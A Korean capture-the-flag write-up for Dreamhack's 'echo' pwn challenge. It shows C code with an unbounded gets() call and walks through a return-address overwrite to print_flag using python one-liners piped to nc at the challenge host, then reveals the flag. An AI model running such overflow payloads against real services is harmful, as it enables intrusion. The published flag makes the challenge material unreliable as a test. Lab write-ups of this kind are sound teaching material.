<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Dreamhack #Pwn echo Write-Up</h1>
</body>
<br>
<br>
</html>

![image](https://github.com/user-attachments/assets/a3541a39-e399-490b-bda6-52f74e619a2f)

먼저 문제를 읽어보면 서버가 입력받은 내용을 그대로 되돌려주는 에코 서버에 대한 것 같다. 

이어서 ```echo.c```코드를 살펴보면

```
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

void print_flag() {
    puts(getenv("FLAG"));
    puts("^^ Flag!!111!!!! ^^");
}

void do_echo() {
    uint8_t echo_buffer[256] = {0};
    gets(echo_buffer);
    puts(echo_buffer);
}

int main(void) {
    puts("ECHO! Echo! echo!");
    do_echo();
    return 0;
}
```

```do_echo()``` 함수에서 ```gets()``` 함수가 ```echo_buffer``` 배열에 사용자 입력을 받아 저장하고, ```puts()```로 다시 출력하는 단순한 에코 기능이 구현되어 있다. 

그리고 가장 눈에 띄는 ```gets()``` 함수인데 ```gets()``` 함수는 버퍼 오버플로우 공격에 취약하다.

```gets()```는 입력된 데이터가 ```echo_buffer```의 크기(256바이트)를 초과하더라도 제한 없이 메모리에 계속 저장하므로, 이 버퍼 오버플로우를 이용해 ```print_flag()``` 함수를 실행할 수 있을 것 같다.

버퍼 오버플로우 공격을 수행하기 위해서는 ```print_flag()```함수의 주소가 필요하니 디버거(gdb)를 사용해서 ```print_flag()```함수의 주소를 찾아보았다.

![image](https://github.com/user-attachments/assets/d505ee95-7578-41cb-b4fc-b1f2c34b8acd)

이때 x86-64 시스템은 리틀 엔디안 형식을 사용하므로 찾은 ```print_flag()```의 주소 ```0x401176```를 입력할 때는 바이트 순서를 반대로 적어야 한다. 즉, ```\x76\x11\x40\x00```로 사용해야 한다.

본격적으로 버퍼 오버플로우 공격을 시도해 보자

아래 코드 처럼 ```echo_buffer```의 크기(256바이트)를 채운 후 ```return address```에 ```print_flag()```의 주소를 넣으면 된다.

```python
python3 -c 'print("A" * 256 + "\x76\x11\x40\x00")' | nc 54.85.45.101 8008
```

![image](https://github.com/user-attachments/assets/e34ec419-aeb2-42f2-a150-1bf44f57827e)

그러나 flag 값이 나오지 않는다.

뭐가 문제인지 잘 모르겠어서 구글링을 해보니 패딩을 늘려가면서 ```return address```에 도달하는 확인해 볼수 있다고 한다. 

그래서 패딩을 256바이트로 늘려 시도해보았다.

```
python -c 'print("A" * 264 + "\x76\x11\x40\x00\x00\x00\x00\x00")' | nc 54.85.45.101 8008
```

![image](https://github.com/user-attachments/assets/b2eb91e7-a9ba-4d90-ae74-d1931407d5e2)

flag를 찾았다!!!!!
flag{curs3d_are_y0ur_eyes_for_they_see_the_fl4g}
